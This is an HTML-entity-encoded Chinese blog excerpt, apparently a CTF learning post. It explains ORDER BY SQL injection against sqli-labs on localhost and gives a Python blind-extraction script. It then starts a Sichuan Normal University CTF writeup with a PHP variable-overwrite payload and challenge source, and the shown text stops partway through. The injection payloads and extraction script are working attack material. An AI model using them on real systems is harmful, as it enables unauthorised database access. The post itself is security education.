&#x8FD9;&#x9053;&#x9898;&#x5176;&#x5B9E;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;mid&#x6765;&#x505A;&#xFF0C;&#x4F1A;&#x66F4;&#x7B80;&#x5355;&#xFF0C;&#x4E0D;&#x4F1A;&#x518D;&#x50CF;&#x8FD9;&#x4E2A;.&#x53F7;&#x4E00;&#x6837;&#x9700;&#x8981;&#x81EA;&#x5DF1;&#x53BB;&#x731C;&#x3002;&#x4F46;&#x8FD8;&#x662F;&#x4F1A;&#x5F88;&#x591A;&#x7684;&#x5751;&#x3002; mid&#x65B9;&#x5F0F;&#x53C2;&#x8003;&#xFF1A;https://www.cnblogs.com/Ragd0ll/p/8684767.html &#x8FD9;&#x9898;&#x8FD9;&#x6837;&#x505A;&#x7684;&#x610F;&#x4E49;&#x66F4;&#x591A;&#x7684;&#x662F;&#x5B66;&#x4E60;regexp&#x76F2;&#x6CE8;&#x5427;&#x3002; 3.ORDER BY &#x6CE8;&#x5165;&#x5148;&#x6765;&#x770B;&#x4E00;&#x4E0B;ORDER BY&#x6CE8;&#x5165;&#x7684;&#x539F;&#x7406; SELECT username, password FROM users order by 1 asc; &#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x5E38;&#x89C1;&#x7684;order by&#x4F7F;&#x7528;&#x8BED;&#x53E5;&#xFF0C;&#x540E;&#x9762;&#x7684;&#x6570;&#x5B57;&#x662F;&#x5217;&#x53F7;(&#x4E5F;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x5217;&#x540D;)&#xFF0C;asc &amp; desc&#x6307;&#x5B9A;&#x662F;&#x5347;&#x5E8F;&#x8FD8;&#x662F;&#x964D;&#x5E8F;&#x3002; &#x6CE8;&#x610F;&#xFF1A;&#x5728;order by&#x540E;&#x9762;&#x7684;&#x4E0D;&#x4F1A;&#x6839;&#x636E;&#x8BA1;&#x7B97;&#x7684;&#x7ED3;&#x679C;&#x6765;&#x6392;&#x5E8F;&#x3002; &#x8FD9;&#x91CC;&#x6709;&#x4EE5;&#x4E0B;&#x51E0;&#x79CD;&#x65B9;&#x5F0F;&#x6765;&#x8FDB;&#x884C;&#x6D4B;&#x8BD5;&#xFF1A; &#x76F4;&#x63A5;&#x52A0;&#x62A5;&#x9519;&#x6CE8;&#x5165;&#x7684;payload&#xFF1A; &#x76F4;&#x63A5;&#x5728;order by&#x540E;&#x9762;&#x52A0;&#x8BED;&#x53E5;&#xFF1A;order by (SELECT extractvalue(1,concat(0x7e,(select @@version),0x7e))) &#x8FDB;&#x884C;&#x62A5;&#x9519;&#x6CE8;&#x5165; rand()&#x65B9;&#x5F0F; rand()&#x4F1A;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;0&#x548C;1&#x4E4B;&#x95F4;&#x7684;&#x968F;&#x673A;&#x6570;&#xFF0C;&#x5982;&#x679C;&#x53C2;&#x6570;&#x88AB;&#x8D4B;&#x503C;&#xFF0C;&#x540C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x4F1A;&#x8FD4;&#x56DE;&#x540C;&#x4E00;&#x4E2A;&#x6570;&#x3002; &#x8FD9;&#x91CC;&#x5C31;&#x53EF;&#x4EE5;&#x7528;&#x5E03;&#x5C14;&#x76F2;&#x6CE8;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x8FDB;&#x884C;&#x6CE8;&#x5165; order by rand(mid(version(),1,1)=5) &#x5F53;&#x7136;&#x8FD9;&#x91CC;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x65F6;&#x95F4;&#x76F2;&#x6CE8;&#x7684;&#x65B9;&#x5F0F;&#x3002; and payload&#x65F6;&#x95F4;&#x76F2;&#x6CE8;&#x65B9;&#x5F0F; &#x5728;order by&#x540E;&#x9762;&#x7684;&#x4E0D;&#x4F1A;&#x6839;&#x636E;&#x8BA1;&#x7B97;&#x7684;&#x7ED3;&#x679C;&#x6765;&#x6392;&#x5E8F;&#xFF0C;&#x4F46;&#x662F;&#x5F53;&#x6211;&#x4EEC;&#x7684;payload&#x6709;&#x5EF6;&#x8FDF;&#x547D;&#x4EE4;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x9875;&#x9762;&#x8FD8;&#x662F;&#x4F1A;&#x5EF6;&#x8FDF;&#x7684;&#x3002; &#x4F7F;&#x7528;and&#x8FDE;&#x63A5;&#x65F6;&#x95F4;&#x5EF6;&#x8FDF;payload&#xFF1A; order by 1 and (If(substr(version(),1,1)=5,0,sleep(5))) &#x8FD9;&#x91CC;&#x7528;sqllib&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x5B66;&#x4E60;&#x7684;&#x4F8B;&#x5B50;&#xFF1A; &#x5B83;&#x7684;&#x6E90;&#x4EE3;&#x7801;&#x4E3A;&#xFF1A; 12$id=$_GET[&apos;sort&apos;];$sql = &quot;SELECT * FROM users ORDER BY $id&quot;; &#x62A5;&#x9519;&#x6CE8;&#x5165;&#x7684;payload&#xFF1A; &#x8BFB;php&#x7248;&#x672C;&#xFF1A; http://127.0.0.1/sqli/Less-46/index.php?sort=(SELECT extractvalue(1,concat(0x7e,(select @@version),0x7e)))--+ &#x8BFB;&#x8868;&#xFF1A; http://127.0.0.1/sqli/Less-46/index.php?sort=(SELECT extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = &apos;security&apos;),0x7e)))--+ &#x8BFB;&#x5B57;&#x6BB5;&#xFF1A; http://127.0.0.1/sqli/Less-46/index.php?sort=(SELECT extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = &apos;users&apos;),0x7e)))--+ &#x8BFB;&#x5185;&#x5BB9;&#xFF1A; http://127.0.0.1/sqli/Less-46/index.php?sort=(SELECT extractvalue(1,concat(0x7e,(SELECT group_concat(username) FROM users),0x7e)))--+ rand()&#x65B9;&#x5F0F;&#x548C;and&#x65F6;&#x95F4;&#x76F2;&#x6CE8;&#x7684;payload&#x57FA;&#x672C;&#x5DEE;&#x4E0D;&#x591A;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x518D;&#x91CD;&#x590D;&#x4E86;&#x3002; &#x53E6;&#x4E00;&#x79CD;order by&#x6CE8;&#x5165; &#x6211;&#x81EA;&#x5DF1;&#x5199;&#x4E86;&#x4E00;&#x4E2A;&#x9898;&#x6765;&#x5B66;&#x4E60;&#x8FD9;&#x4E00;&#x79CD;order by&#x6CE8;&#x5165;&#x3002;&#x9898;&#x76EE;&#x8FC7;&#x6EE4;&#x4E86;F1g3&#x8FD9;&#x4E2A;&#x5B57;&#x6BB5;&#x540D;&#x3002;&#x5728;id=3&#x65F6;&#xFF0C;F1g3&#x5B57;&#x6BB5;&#x5B58;&#x5728;flag&#x7684;base16&#x7F16;&#x7801;&#x3002;(&#x76F4;&#x63A5;&#x8FC7;&#x6EE4;Flag&#x4F1A;&#x66F4;&#x597D;) &#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#xFF1A; $sql = &quot;SELECT id, F1ag, username FROM this_1s_th3_fiag_tab13 WHERE id = &quot;.$id.&quot;;&quot;; &#x5DF2;&#x77E5;&#xFF1A;&#x6570;&#x636E;&#x5E93;&#x540D;&#xFF1A;user&#xFF0C;&#x8868;&#x540D;&#xFF1A;this_1s_th3_fiag_tab13&#xFF0C;&#x5B57;&#x6BB5;&#x540D;&#xFF1A;F1g3&#xFF0C;&#x5217;&#x53F7;&#x4E3A;2 &#x56E0;&#x4E3A;&#x8FC7;&#x6EE4;&#x4E86;F1g3&#x8FD9;&#x4E2A;&#x5B57;&#x6BB5;&#x540D;&#xFF0C;&#x6211;&#x4EEC;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x7528;&#x666E;&#x901A;&#x76F2;&#x6CE8;&#x7684;&#x65B9;&#x5F0F;&#x5F97;&#x5230;Flag&#xFF0C;&#x6240;&#x4EE5;&#x5C31;&#x5F97;&#x4F7F;&#x7528;&#x4E00;&#x79CD;&#x7279;&#x522B;&#x7684;order by&#x76F2;&#x6CE8;&#x3002; &#x8BBF;&#x95EE;&#xFF1A; index.php?id=3 union select 1,2,3 order by 1 &#x8FD4;&#x56DE;&#xFF1A; id: 1 name: 3 id: 3 name: threezh1 &#x53EF;&#x4EE5;&#x770B;&#x5230;&#x8FD9;&#x91CC;&#x7684;1&#xFF0C;3&#x5206;&#x522B;&#x5BF9;&#x5E94;&#x4E86;id&#x548C;name&#x3002; &#x5E76;&#x4F7F;&#x7528;&#x4E86;order by&#x6307;&#x5B9A;id&#x6392;&#x5E8F;&#x3002; &#x5F53;&#x6211;&#x4EEC;&#x5C06;&#x5B57;&#x6BB5;1&#x4FEE;&#x6539;&#x4E3A;4&#x65F6;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BBF;&#x95EE;&#xFF1A; index.php?id=3 union select 4,2,3 order by 1 &#x5C31;&#x4F1A;&#x8FD4;&#x56DE;&#xFF1A; id: 3 name: threezh1 id: 4 name: 3 &#x8FD9;&#x662F;&#x56E0;&#x4E3A;&#xFF0C;&#x5728;&#x6392;&#x5E8F;&#x7684;&#x65F6;&#x5019;&#xFF0C;order by&#x662F;&#x9ED8;&#x8BA4;&#x5347;&#x5E8F;&#x6392;&#x5217;&#x3002;select 4,2,3&#x65F6;&#x5C31;&#x4F1A;&#x6392;&#x5230;&#x540E;&#x9762;&#x3002; &#x6839;&#x636E;&#x8FD9;&#x4E2A;&#x5DEE;&#x5F02;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x6309;&#x7B2C;&#x4E8C;&#x5217;&#x6765;&#x6392;&#x5E8F;&#xFF0C;&#x5E76;&#x5728;select&#x91CC;&#x731C;&#x6D4B;flag&#x7684;&#x503C;&#x3002;&#x8FD9;&#x6837;&#x5C31;&#x53EF;&#x4EE5;&#x4E0D;&#x4F7F;&#x7528;F1g3&#x8FD9;&#x4E2A;&#x5B57;&#x6BB5;&#x540D;&#x5C31;&#x628A;&#x503C;&#x8BFB;&#x51FA;&#x6765;&#x3002; &#x8BBF;&#x95EE;&#xFF1A;/index.php?id=3 union select 1,&apos;6&apos;,3 order by 2 &#x8FD4;&#x56DE;&#xFF1A; id: 1 name: 3 id: 3 name: threezh1 &#x8BBF;&#x95EE;&#xFF1A;/index.php?id=3 union select 1,&apos;7&apos;,3 order by 2 &#x8FD4;&#x56DE;&#xFF1A; id: 3 name: threezh1 id: 1 name: 3 &#x51FA;&#x73B0;&#x5DEE;&#x522B;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A;&#x8FD9;&#x91CC;&#x662F;&#x5927;&#x4E8E;&#x624D;&#x4F1A;&#x51FA;&#x73B0;&#x6392;&#x5E8F;&#x4E0D;&#x4E00;&#x6837;&#xFF0C;&#x6240;&#x4EE5;flag&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E3A;6&#x3002; &#x6309;&#x7167;&#x8FD9;&#x4E2A;&#x601D;&#x8DEF;&#xFF0C;&#x5199;&#x51FA;&#x811A;&#x672C;&#xFF1A; 1234567891011121314151617import requestskey = &quot;&lt;tr&gt;&lt;td&gt; id: 3 &lt;/td&gt; &lt;td&gt; name: threezh1 &lt;/td&gt; &lt;br/&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt; id: 3 &lt;/td&gt; &lt;td&gt; name: 3 &lt;/td&gt; &lt;br/&gt;&lt;/tr&gt;&quot;words = &quot;&quot;data = &quot;id=3 union select 3,&apos;{0}&apos;,3 order by 2&quot;dic = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;for i in range(100): for j in dic: payload = data.format(words + j) print(payload) content = requests.get(&quot;http://127.0.0.1/index.php?&quot; + payload) if key in content.text: words = words + temp print(words) break temp = j &#x6700;&#x540E;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5F97;&#x5230;flag&#x7684;base16&#x7F16;&#x7801;&#x3002; &#x8FD9;&#x91CC;&#x6709;&#x4E2A;&#x95EE;&#x9898;&#x5C31;&#x662F;&#xFF0C;&#x5F53;select 1,2,3 &#x4E2D;&#x5B57;&#x6BB5;&#x4F4D;&#x7684;&#x6570;&#x636E;&#x4E0E;&#x6570;&#x636E;&#x5E93;&#x91CC;&#x7684;&#x6570;&#x636E;&#x76F8;&#x7B49;&#x65F6;&#xFF0C;&#x5339;&#x914D;&#x7684;&#x65F6;&#x5019;&#x5982;&#x679C;&#x662F;&#x5339;&#x914D;&#x7684;&#x662F;7&#x5C31;&#x662F;7&#x4E0D;&#x7528;&#x518D;&#x9000;&#x4E00;&#x4F4D;&#x3002; &#x6700;&#x540E;&#x8DD1;&#x51FA;&#x6765;&#x662F; 666c61677b643067335f74687265657a68317c &#x90A3;&#x4E48;&#x771F;&#x5B9E;&#x7684;flag&#x7684;base16&#x7F16;&#x7801;&#x4E3A;&#xFF1A;666c61677b643067335f74687265657a68317d &#x89E3;&#x7801;&#x5373;&#x53EF; &#x9898;&#x76EE;&#x6E90;&#x7801;&#xFF1A; 123456789101112131415161718192021222324252627282930313233343536373839&lt;?php$dbhost = &apos;localhost&apos;; // mysql&#x670D;&#x52A1;&#x5668;&#x4E3B;&#x673A;&#x5730;&#x5740;$dbuser = &apos;root&apos;; // mysql&#x7528;&#x6237;&#x540D;$dbpass = &apos;root&apos;; // mysql&#x7528;&#x6237;&#x540D;&#x5BC6;&#x7801;$conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ){ die(&apos;Could not connect: &apos; . mysqli_error());}mysqli_select_db($conn, &apos;user&apos;);$id = $_GET[&apos;id&apos;];if (!isset($id)){ echo &quot;Please tell me the id , And you should think what is the sort way.&quot;; exit();}//echo strtolower($id).&quot;&lt;br/&gt;&quot;;if (preg_match(&apos;/(char|hex|conv|lower|lpad|into|password|md5|encode|decode|convert|cast)/i&apos;,strtolower($id)) != 0){ //|\\s echo &quot;NoNoNo&quot;; exit();}if (stripos($id, &quot;F1ag&quot;)){ echo &quot;Close, but No!!! Thinking...&quot;; exit();}$sql = &quot;SELECT id, F1ag, username FROM this_1s_th3_fiag_tab13 WHERE id = &quot;.$id.&quot;;&quot;;$retval = mysqli_query($conn, $sql);if(!$retval){ die(&apos;???&apos;);// . mysqli_error($conn)}while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC)){ echo &quot;&lt;tr&gt;&lt;td&gt; id: {$row[&apos;id&apos;]} &lt;/td&gt; &quot;. &quot;&lt;td&gt; name: {$row[&apos;username&apos;]} &lt;/td&gt; &lt;br/&gt;&quot;. &quot;&lt;/tr&gt;&quot;;}mysqli_close($conn);?&gt; sql: 12345678910111213141516171819202122SET NAMES utf8mb4;SET FOREIGN_KEY_CHECKS = 0;-- ------------------------------ Table structure for this_1s_th3_fiag_tab13-- ----------------------------DROP TABLE IF EXISTS `this_1s_th3_fiag_tab13`;CREATE TABLE `this_1s_th3_fiag_tab13` ( `id` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL, `F1ag` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL, `username` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL, `password` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL) ENGINE = MyISAM CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;-- ------------------------------ Records of this_1s_th3_fiag_tab13-- ----------------------------INSERT INTO `this_1s_th3_fiag_tab13` VALUES (&apos;3&apos;, &apos;666C61677B643067335F74687265657A68317D&apos;, &apos;threezh1&apos;, &apos;You is pig&apos;);INSERT INTO `this_1s_th3_fiag_tab13` VALUES (&apos;1&apos;, &apos;No the Flag&apos;, &apos;oops,This is not the flag id&apos;, &apos;You is pig&apos;);INSERT INTO `this_1s_th3_fiag_tab13` VALUES (&apos;2&apos;, &apos;No the Flag&apos;, &apos;Not the flag also&apos;, &apos;You is pig&apos;);SET FOREIGN_KEY_CHECKS = 1; &#x53C2;&#x8003; https://www.anquanke.com/post/id/160584 https://blog.csdn.net/Kevinhanser/article/details/81592863 https://skysec.top/2017/11/19/%E8%BF%91%E6%9C%9F%E5%81%9A%E7%9A%84%E5%85%B6%E4%BB%96%E5%B9%B3%E5%8F%B0%E7%9A%843%E9%81%93%E6%B3%A8%E5%85%A5%E9%A2%98/","link":"/2019/06/09/从CTF题中学习几种有趣(奇怪)的SQL注入/"},{"title":"川师线下CTF Writeup","text":"&#x8BF4;&#x5728;&#x524D;&#x9762;&#x8FD9;&#x6B21;&#x548C;&#x961F;&#x53CB;&#x4E00;&#x8D77;&#x53BB;&#x5DDD;&#x5E08;&#x6253;&#x4E86;&#x4E00;&#x6B21;&#x7EBF;&#x4E0B;&#x7684;CTF&#x3002;&#x867D;&#x7136;&#x6BD4;&#x8D5B;&#x4E2D;&#x5F88;&#x591A;&#x9898;&#x90FD;&#x6CA1;&#x505A;&#x51FA;&#x6765;&#xFF0C;&#x4F46;&#x5B66;&#x5230;&#x5F88;&#x591A;&#x4E1C;&#x897F;&#x3002;&#x8D5B;&#x540E;&#x51FA;&#x9898;&#x5E08;&#x5085;&#x4E5F;&#x7ED9;&#x51FA;&#x4E86;&#x6E90;&#x7801;&#x548C;Writeup&#xFF0C;&#x6293;&#x4F4F;&#x673A;&#x4F1A;&#x603B;&#x7ED3;&#x5B66;&#x4E60;&#x3002; &#x91CD;&#x65B0;&#x642D;&#x5EFA;&#x9898;&#x76EE;&#x7684;&#x73AF;&#x5883;&#x6709;&#x70B9;&#x56F0;&#x96BE;&#xFF0C;&#x6240;&#x4EE5;&#x8FD8;&#x662F;&#x6709;&#x4E24;&#x9898;&#x65E0;&#x6CD5;&#x8FDB;&#x884C;&#x590D;&#x73B0;&#x3002; Web418&#x6253;&#x5F00;&#x7F51;&#x9875;&#x540E;&#x662F;&#x4E00;&#x4E2A;418&#x7684;&#x9519;&#x8BEF;&#x9875;&#x9762;&#x3002; Google&#x4E86;&#x4E00;&#x4E0B;418&#x9519;&#x8BEF; &#x201C;ERR&#xFF01;418 &#x6211;&#x662F;&#x8336;&#x58F6;&#x201D;&#x8D77;&#x6E90; &#x201C;&#x9519;&#x8BEF; 418 &#x6211;&#x662F;&#x8336;&#x58F6;&#x201D;&#x6D88;&#x606F;&#x4E0D;&#x662F;&#x6807;&#x51C6;&#x7684;&#x670D;&#x52A1;&#x5668;&#x9519;&#x8BEF;&#x7C7B;&#x578B;&#xFF0C;&#x8FD9;&#x662F; 1998 &#x5E74;&#x7684;&#x4E00;&#x4E2A;&#x611A;&#x4EBA;&#x8282;&#x6076;&#x4F5C;&#x5267;&#xFF0C;&#x8DDD;&#x4ECA;&#x5DF2;&#x6709; 20 &#x5E74;&#x4E86;&#x3002;&#x8BB8;&#x591A;&#x5F00;&#x53D1;&#x56E2;&#x961F;&#x5728;&#x4ED6;&#x4EEC;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4E2D;&#x5B9E;&#x65BD;&#x4E86;&#x201C;&#x9519;&#x8BEF; 418 &#x6211;&#x662F;&#x8336;&#x58F6;&#x201D;&#x7684;&#x6D88;&#x606F;&#x4F5C;&#x4E3A;&#x5185;&#x90E8;&#x7B11;&#x8BDD;&#xFF0C;&#x901A;&#x5E38;&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;&#x9519;&#x8BEF;&#x6765;&#x5904;&#x7406;&#x672A;&#x77E5;&#x6765;&#x6E90;&#x7684;&#x9519;&#x8BEF;&#x3002; &#x53C8;&#x5728;cookie&#x5904;&#x53D1;&#x73B0;&#x4E86;&#x4E00;&#x4E2A;base64&#x52A0;&#x5BC6;&#x7684;&#x503C;&#xFF1A; &#x89E3;&#x5BC6;&#x540E;&#x4E3A;&#xFF1A;coffee &#x7528;Brupsuite&#x6293;&#x5305;&#x540E;&#x4FEE;&#x6539;&#x4E86;cookie&#x7684;&#x503C;&#xFF0C;&#x7F51;&#x9875;&#x63D0;&#x793A;&#xFF1A; Tell me what you want ! &#x4E8E;&#x662F;&#x6211;&#x4FEE;&#x6539;&#x4E3A;flag&#x7684;&#x52A0;&#x5BC6;&#x503C;&#xFF0C;&#x6CA1;&#x7528;&#x3002;&#x5728;&#x4FEE;&#x6539;&#x5F88;&#x591A;&#x6B21;&#x4E4B;&#x540E;&#x961F;&#x53CB;&#x89E3;&#x51FA;&#x6765;&#x4E86;&#x3002;&#x7ADF;&#x7136;&#x662F;tea&#x7684;base64&#x3002; &#x4FEE;&#x6539;cookie&#x540E;&#x8BBF;&#x95EE;&#x5F97;&#x5230;flag&#xFF0C;&#x8FD9;&#x9898;&#xFF0C;&#x771F;&#x7684;&#x6709;&#x70B9;&#x8003;&#x8111;&#x6D1E;&#x3002; &#x7B7E;&#x5230;&#x9898;&#x662F;&#x4E00;&#x9053;&#x7B80;&#x5355;&#x7684;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;&#x9898;&#x3002; 1234567891011121314151617181920&lt;?phprequire(&apos;config.php&apos;);$user = null;if(!empty($_GET[&apos;data&apos;])) { try { $data = json_decode($_GET[&apos;data&apos;], true); } catch (Exception $e) { $data = []; } extract($data); if($users[$username]) { $user = $username; }}if ($user==$usname) { echo &quot;sicnuctf{************}&quot;;}?&gt; &#x53C2;&#x6570;data&#x5728;&#x7ECF;&#x8FC7;json_decode&#x4E4B;&#x540E;&#x8FDB;&#x884C;&#x4E86;&#x53D8;&#x91CF;&#x8986;&#x76D6;&#x3002; &#x6784;&#x9020;payload&#xFF1A; data = {&#x201C;usname&#x201D;:&#x201D;123&#x201D;, &#x201C;users&#x201D;:{&#x201C;username&#x201D;:&#x201D;123&#x201D;}, &#x201C;user&#x201D;:&#x201D;123&#x201D;} &#x5F97;&#x5230;Flag PHP&#x662F;&#x4E16;&#x754C;&#x4E0A;&#x6700;&#x597D;&#x7684;&#x8BED;&#x8A00;&#x7528;&#x5FA1;&#x5251;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8DD1;&#x51FA;&#x767B;&#x5F55;&#xFF0C;&#x6CE8;&#x518C;&#x7684;&#x6E90;&#x7801;&#x5730;&#x5740;&#xFF0C;&#x6CE8;&#x518C;&#x4E00;&#x4E2A;&#x8D26;&#x53F7;&#xFF0C;&#x767B;&#x5F55;&#x8FDB;&#x53BB;&#x53EF;&#x4EE5;&#x62FF;&#x5230;member.php&#x7684;&#x6E90;&#x7801;&#x3002; register.php 1234567891011121314151617181920212223242526272829303132333435&lt;?phpinclude(&apos;config.php&apos;);try{$pdo = new PDO(&apos;mysql:host=localhost;dbname=***&apos;, &apos;***&apos;, &apos;***&apos;);}catch (Exception $e){die(&apos;mysql connected error&apos;);} //str_shuffle()&#x968F;&#x673A;&#x5730;&#x6253;&#x4E71;&#x5B57;&#x7B26;&#x4E32;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x5B57;&#x7B26;$admin = &quot;sicnu&quot;.&quot;#&quot;.str_shuffle(&apos;hello_here_is_your_flag_but_it_no_easy&apos;);$username = (isset($_POST[&apos;username&apos;]) === true &amp;&amp; $_POST[&apos;username&apos;] !== &apos;&apos;) ? (string)$_POST[&apos;username&apos;] : die(&apos;Missing username&apos;);$password = (isset($_POST[&apos;password&apos;]) === true &amp;&amp; $_POST[&apos;password&apos;] !== &apos;&apos;) ? (string)$_POST[&apos;password&apos;] : die(&apos;Missing password&apos;);$code = (isset($_POST[&apos;code&apos;]) === true) ? (string)$_POST[&apos;code&apos;] : &apos;&apos;;if (strlen($username) &gt; 16 || strlen($username) &gt; 16) {die(&apos;is too long&apos;);}$sth = $pdo-&gt;prepare(&apos;SELECT username FROM users WHERE username = :username&apos;);$sth-&gt;execute([&apos;:username&apos; =&gt; $username]);if ($sth-&gt;fetch() !== false) {die(&apos;username has been registered&apos;);}$sth = $pdo-&gt;prepare(&apos;INSERT INTO users (username, password) VALUES (:username, :password)&apos;);$sth-&gt;execute([&apos;:username&apos; =&gt; $username, &apos;:password&apos; =&gt; $password]);preg_match(&apos;/^(sicnu)((?:#|\\w)+)$/i&apos;, $code, $matches);if (count($matches) === 3 &amp;&amp; $admin === $matches[0]) {$sth = $pdo-&gt;prepare(&apos;INSERT INTO inspect (username, permit) VALUES (:username, :permit)&apos;);$sth-&gt;execute([&apos;:username&apos; =&gt; $username, &apos;:permit&apos; =&gt; $matches[1]]);} else {$sth = $pdo-&gt;prepare(&apos;INSERT INTO inspect (username, permit) VALUES (:username, &quot;TERRIBLE&quot;)&apos;);$sth-&gt;execute([&apos;:username&apos; =&gt; $username]);}echo &apos;&lt;script&gt;alert(&quot;register success&quot;);location.href=&quot;log.html&quot;&lt;/script&gt;&apos;; ?&gt; Log.php 1234567891011121314151617181920212223242526&lt;?phpsession_start();include(&apos;config.php&apos;);try{$pdo = new PDO(&apos;mysql:host=localhost;dbname=***&apos;, &apos;***&apos;, &apos;***&apos;);}catch (Exception $e){die(&apos;mysql connected error&apos;);}$username = (isset($_POST[&apos;username&apos;]) === true &amp;&amp; $_POST[&apos;username&apos;] !== &apos;&apos;) ? (string)$_POST[&apos;username&apos;] : die(&apos;Missing username&apos;);$password = (isset($_POST[&apos;password&apos;]) === true &amp;&amp; $_POST[&apos;password&apos;] !== &apos;&apos;) ? (string)$_POST[&apos;password&apos;] : die(&apos;Missing password&apos;);if (strlen($username) &gt; 32 || strlen($password) &gt; 32) {die(&apos;is too long&apos;);}$sth = $pdo-&gt;prepare(&apos;SELECT password FROM users WHERE username = :username&apos;);$sth-&gt;execute([&apos;:username&apos; =&gt; $username]);if ($sth-&gt;fetch()[0] !== $password) {die(&apos;Error in username or password&apos;);}$_SESSION[&apos;username&apos;] = $username;unset($_SESSION[&apos;is_logined&apos;]);unset($_SESSION[&apos;is_guest&apos;]);#echo $username;header(&quot;Location: member.php&quot;); ?&gt; Member.php 123456789101112131415161718192021222324252627282930&lt;?phperror_reporting(0);session_start();include(&apos;config.php&apos;);if (isset($_SESSION[&apos;username&apos;]) === false) {die(&apos;please login first&apos;);}try{$pdo = new PDO(&apos;mysql:host=localhost;dbname=***&apos;, &apos;***&apos;, &apos;***&apos;);}catch (Exception $e){die(&apos;mysql connected error&apos;);}$sth = $pdo-&gt;prepare(&apos;SELECT permit FROM inspect WHERE username = :username&apos;);$sth-&gt;execute([&apos;:username&apos; =&gt; $_SESSION[&apos;username&apos;]]);if ($sth-&gt;fetch()[0] === &apos;TERRIBLE&apos;) {$_SESSION[&apos;is_guest&apos;] = true;}$_SESSION[&apos;is_logined&apos;] = true;if (isset($_SESSION[&apos;is_logined&apos;]) === false || isset($_SESSION[&apos;is_guest&apos;]) === true) { echo &quot;no no no!&quot;;}else{if(isset($_GET[&apos;file&apos;])===false)echo &quot;no&quot;;elseif(is_file($_GET[&apos;file&apos;]))echo &quot;you cannot give me a file&quot;;elsereadfile($_GET[&apos;file&apos;]);}?&gt; &#x62FF;&#x5230;Flag&#x7684;&#x5173;&#x952E;&#x5728;&#x4E8E;&#x8981;&#x7ED5;&#x8FC7;&#x4E00;&#x4E2A;is_guest&#x5224;&#x65AD;&#x3002; member.php&#x6E90;&#x7801;&#x5904;&#xFF1A; 1234567&lt;?php$sth = $pdo-&gt;prepare(&apos;SELECT permit FROM inspect WHERE username = :username&apos;);$sth-&gt;execute([&apos;:username&apos; =&gt; $_SESSION[&apos;username&apos;]]);if ($sth-&gt;fetch()[0] === &apos;TERRIBLE&apos;) {$_SESSION[&apos;is_guest&apos;] = true;}?&gt; &#x800C;TERRIBLE&#x662F;&#x5728;&#x6CE8;&#x518C;&#x65F6;&#x5199;&#x5165;&#x7684;&#xFF0C;&#x5728;register.php&#x6E90;&#x7801;&#x4E2D;&#xFF1A; 12345678910&lt;?phppreg_match(&apos;/^(sicnu)((?:#|\\w)+)$/i&apos;, $code, $matches);if (count($matches) === 3 &amp;&amp; $admin === $matches[0]) {$sth = $pdo-&gt;prepare(&apos;INSERT INTO inspect (username, permit) VALUES (:username, :permit)&apos;);$sth-&gt;execute([&apos;:username&apos; =&gt; $username, &apos;:permit&apos; =&gt; $matches[1]]);} else {$sth = $pdo-&gt;prepare(&apos;INSERT INTO inspect (username, permit) VALUES (:username, &quot;TERRIBLE&quot;)&apos;);$sth-&gt;execute([&apos;:username&apos; =&gt; $username]);}?&gt; &#x5148;&#x8FDB;&#x884C;&#x4E86;&#x4E00;&#x4E2A;&#x6B63;&#x5219;&#x5339;&#x914D;&#xFF0C;&#x518D;&#x8FDB;&#x884C;&#x4E86;if&#x8BED;&#x53E5;&#xFF0C;&#x5176;&#x4E2D;&#x4E00;&#x4E2A;&#x6761;&#x4EF6;&#x4E3A;$admin === $matches[0] &#x6839;&#x636E;&#x524D;&#x9762;&#x7684;$admin = &quot;sicnu&quot;.&quot;#&quot;.str_shuffle(&apos;hello_here_is_your_flag_but_it_no_easy&apos;); &#x53EF;&#x77E5;,admin&#x7684;&#x503C;&#x4E3A;&#x4E00;&#x4E2A;&#x968F;&#x673A;&#x503C;&#xFF0C;&#x8FD9;&#x91CC;&#x53EA;&#x80FD;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#x3002; &#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x6761;&#x4EF6;&#x7ADE;&#x4E89;&#x7ED5;&#x8FC7; &#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;&#x7684;&#x610F;&#x4E49;&#x5982;&#x56FE;&#x6240;&#x793A; 